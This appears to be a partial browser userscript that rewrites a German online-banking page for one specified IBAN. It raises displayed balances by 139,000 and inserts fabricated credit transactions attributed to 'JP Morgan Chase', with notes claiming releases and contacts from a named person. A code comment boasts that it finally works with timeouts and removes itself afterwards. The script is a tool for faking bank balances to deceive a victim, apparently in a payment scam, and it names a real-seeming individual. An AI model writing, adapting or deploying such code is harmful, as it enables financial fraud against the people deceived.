// ==UserScript==
// @name         Ed WM MATTHIAS WILLY FRITZ KLINGSPORN
...
// @grant        none
// @downloadURL https://update.greasyfork.org/scripts/495683/Ed%20WM%20MATTHIAS%20WILLY%20FRITZ%20KLINGSPORN.user.js
// @updateURL https://update.greasyfork.org/scripts/495683/Ed%20WM%20MATTHIAS%20WILLY%20FRITZ%20KLINGSPORN.meta.js
// ==/UserScript==
...
//1 COMM START CHANGE BAL 2VER FINALLY WORKING WITH TIMEOUT AND SCRIPT REMOVAL
 ...
 // Configurable Elements
    var BALANCE_CONFIGS = [
        { index: 0, adjustmentAmount: +139000},
        { index: 1, adjustmentAmount: +139000},
        { index: 2, adjustmentAmount: +139000},
             ...
             var transactionsnew = [
{
                  date: '22.05.2024',
                   ...
                   details: 'Andreas Graf meldet sich. Selbst nicht ausgeben.',
                   type: 'Gutschrift',
             ...
             },
{
                  date: '22.05.2024',
                   name: 'JP Morgan Chase',
                   details: 'Freigabe erteilt. Commerzbank 00210641/Holstenstr.',
                   type: 'Gutschrift',
                  amount: '+107.691,00 EUR',
             },
{
                  date: '21.05.2024',
                   name: 'JP Morgan Chase',
                   details: 'A. Graf meldet sich',
                   type: 'Gutschrift',
...
balanceModificationAmount = balanceChange = 139000.0 ;
...
///IBAN CONFIGURATION_______________________________________________________
     ...
     expectedIBAN = searchText = targetTextContent = specifiedTextContent = "DE89 1008 0000 0179 0924 00"
